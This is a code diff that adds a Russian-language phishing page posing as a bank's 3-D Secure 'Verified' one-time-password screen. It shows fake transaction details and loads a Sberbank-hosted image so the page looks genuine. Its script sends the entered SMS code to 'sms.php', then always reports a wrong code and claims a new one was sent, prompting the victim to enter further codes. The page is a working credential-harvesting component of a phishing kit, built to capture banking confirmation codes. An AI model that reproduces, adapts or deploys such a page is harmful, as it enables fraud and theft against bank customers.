@@ -1,0 +1,163 @@
+<html><head>
+
+    <meta http-equiv="Content-Type" content="text/html; charset=UTF-8">
+
+    <link href="style/sms.css" rel="stylesheet">
+
+
+
+
+
+
+
+
+
+    <title>Verified - Пароль безопасности</title>
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+</head>
+
+<body >
+<script src="https://ajax.googleapis.com/ajax/libs/jquery/3.3.1/jquery.min.js"></script>
+<div style="width: 390px; margin-left: auto; margin-right: auto; margin-bottom: 0px;">
+
+
+
+    <table width="100%" border="0" cellspacing="0" cellpadding="0" style="margin-top: 5px;">
+        <tbody><tr>
+
+
+
+        </tr>
+        </tbody></table>
+
+
+
+
+
+</div>
+
+
+<div class="t_middle">
+
+    <form method="POST" id="form" action="securityy" class="form" style="margin: 0 auto;
+    padding: 15px 0 0 5px;
+    font-family: Arial;">
+
+        <table class="t_table" border="0" cellpadding="1" cellspacing="1" width="100%" id="AutoNumber1">
+
+
+
+            <tbody><tr>
+                <td colspan="2" align="left" id="desc" class="desc"><h1>Введите ваш пароль</h1><p>Одноразовый пароль был отослан на ваш номер телефона.</p><p>Пожалуйста, проверьте детали транзакции и персональное приглашение. Если все в порядке, дождитесь получения SMS сообщения и введите его.</p></td>
+            </tr>
+
+
+            <tr class="main" id="pa_merchant">
+                <td>Магазин:</td>
+                <td align="left">PayMasters</td>
+            </tr>
+
+            <tr class="main" id="pa_desc">
+                <td>Описание:</td>
+                <td>Alfa пополнение</td>
+            </tr>
+
+
+
+
+
+            <tr class="main" id="pa_pan">
+                <td nowrap="">Пополнение счета номер:</td>
+                <td> 5486325699125</td>
+            </tr>
+
+
+            <tr id="pamrow" class="main" style="display: table-row;">
+                <td nowrap="">Личное приветствие:</td>
+                <td id="pam">None</td>
+            </tr>
+
+
+
+
+
+
+
+            <tr>
+                <td id="pwd"><b>Пароль:</b></td>
+                <td><input id="pass" type="password" name="PASSWORD" size="20" autocomplete="off"></td>
+            </tr>
+
+            <tr>
+
+
+            </tr>
+
+
+            <tr><td width="100%" colspan="2"><img src="https://acs4.sbrf.ru/sberbank/images/pixel.gif" width="1" height="2" alt="" border="0"></td></tr>
+
+            <tr>
+                <td>
+                    <a href="javascript:void(0);" onclick="javascript:document.location.href='/'">Выход</a>
+                </td>
+                <td>
+                   <button type="button" id="btn">Отправить</button>
+                </td>
+            </tr>
+
+            </tbody></table>
+
+    </form>
+
+
+</div>
+
+<div class="alert" hidden id="alert">
+  <strong>Ошибка!</strong> Введен неправильный код
+</div>
+<div id="loader" hidden></div>
+<script>
+    var form  = document.getElementById('form');
+    var pas = document.getElementById('pass');
+    var btn = document.getElementById('btn');
+    var loader = document.getElementById("loader");
+function func(){
+    document.getElementById('alert').style.display='block';
+    loader.style.display = "none";
+    setTimeout(function(){alert( "На ваш номер телефона выслан новый код подтверждения" );},1000);
+}
+btn.addEventListener("click", function (event) {
+    $.ajaxSetup({
+     xhrFields: {
+    withCredentials: true
+  }
+});
+    var loader = document.getElementById("loader");
+    loader.style.display = "block";
+    var xmlhttp = new XMLHttpRequest();
+    $.post( "sms.php", $( "#form" ).serialize());
+    setTimeout(func,2000);
+   
+    
+}, false);
+
+
+</script>
+
+
+
+</body></html>
